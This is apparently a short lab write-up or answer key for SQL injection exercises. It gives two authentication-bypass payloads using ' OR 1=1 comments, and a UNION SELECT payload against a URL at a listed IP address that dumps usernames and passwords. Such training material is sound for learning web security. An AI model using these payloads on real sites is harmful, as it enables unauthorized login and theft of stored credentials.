----------------------------------
# SQL Injection

## Authentication Bypass Variant 1
### query:
SELECT * FROM users WHERE username='admin' AND password='pass'

### task:
You know how SQL is used to create login pages. Use that knowledge and try to figure out a way to login without any credentials. 

### payload:
*username*:admin

*password*:pass' OR 1=1 --+

**NOTE:** + is similar to space in URL encoding




## Authentication Bypass Variant 2
### query:
SELECT * FROM users WHERE username='admin' AND password='1a1dc91c907325c69271ddf0c944bc72'

### task:
You already know how to do a basic authentication bypass. Now try to do this one with a slight twist.

### payload:
*username*:admin' OR 1=1 -- 

*password*:123



## GET Based SQL Injection in URL Variant 1
### query:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff

### task:
Your task is to fetch all the usernames and passwords from the database of the website below.

### payload:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff' UNION SELECT username,password FROM users --+